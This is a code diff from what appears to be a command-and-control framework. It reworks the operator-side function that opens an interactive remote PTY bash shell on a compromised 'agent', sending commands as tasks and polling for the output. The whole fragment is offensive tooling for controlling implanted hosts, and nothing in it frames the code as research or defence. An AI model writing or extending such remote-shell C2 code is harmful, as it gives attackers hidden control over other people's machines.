@@ -185,26 +185,27 @@ def revshell(manager, agent_id, c2_server):
 
 
 def _fast_http_shell(manager, agent_id):
-    _write(f"{Fore.CYAN}[*] Fast HTTP PTY shell (polling every 0.5s){Style.RESET_ALL}\n")
+    _write(f"{Fore.CYAN}[*] Fast HTTP PTY shell{Style.RESET_ALL}\n")
     _write(f"{Fore.CYAN}[*] Type 'exit' to return{Style.RESET_ALL}\n\n")
 
-    tid = manager.send_task(agent_id, "SHELL:", {})
+    # Use shell_interactive (persistent PTY bash), not SHELL: protocol
+    cmd = "echo SHELL_READY"
+    tid = manager.send_task(agent_id, "shell_interactive", {"command": cmd})
     if not tid:
+        _write("[!] Agent unreachable\n")
         return
 
-    ready = False
     for _ in range(20):
         time.sleep(0.5)
         for r in manager.consume_results(agent_id):
-            out = r.get("output", "")
-            if out.startswith("SHELL:ready:"):
-                data = strip_ansi(base64.b64decode(out[11:]).decode())
-                _write(data)
-                ready = True
+            if r.get("task_id") == tid:
+                _write("[+] Shell ready\n")
                 break
-        if ready:
-            break
-    if not ready:
+        else:
+            continue
+        break
+    else:
+        _write("[!] Shell init failed\n")
         return
 
     while True:
@@ -218,25 +219,31 @@ def _fast_http_shell(manager, agent_id):
         if not cmd.strip():
             continue
 
-        b64 = base64.b64encode(cmd.encode()).decode()
-        tid = manager.send_task(agent_id, f"SHELL_CMD:{b64}", {})
+        tid = manager.send_task(agent_id, "shell_interactive", {"command": cmd.strip()})
+        if not tid:
+            break
 
         for _ in range(30):
             time.sleep(0.3)
             for r in manager.consume_results(agent_id):
                 out = r.get("output", "")
                 if r.get("task_id") == tid:
-                    try:
-                        data = strip_ansi(base64.b64decode(out).decode())
-                    except Exception:
-                        data = out
-                    _write(data)
-                elif out.startswith("SHELL_DRAIN:"):
+                    if out:
+                        _write(out + ("\n" if not out.endswith("\n") else ""))
+                    break
+            else:
+                continue
+            break
+
+        # Drain any SHELL_DRAIN results from agent's continuous PTY drain
+        for _ in range(4):
+            time.sleep(0.3)
+            for r in manager.consume_results(agent_id):
+                out = r.get("output", "")
+                if out.startswith("SHELL_DRAIN:"):
                     try:
                         data = strip_ansi(base64.b64decode(out[12:]).decode())
-                        _write(data)
+                        if data.strip():
+                            _write(data)
                     except Exception:
                         pass
-                elif out.startswith("SHELL:exited"):
-                    _write("\n[+] Shell exited\n")
-                    return
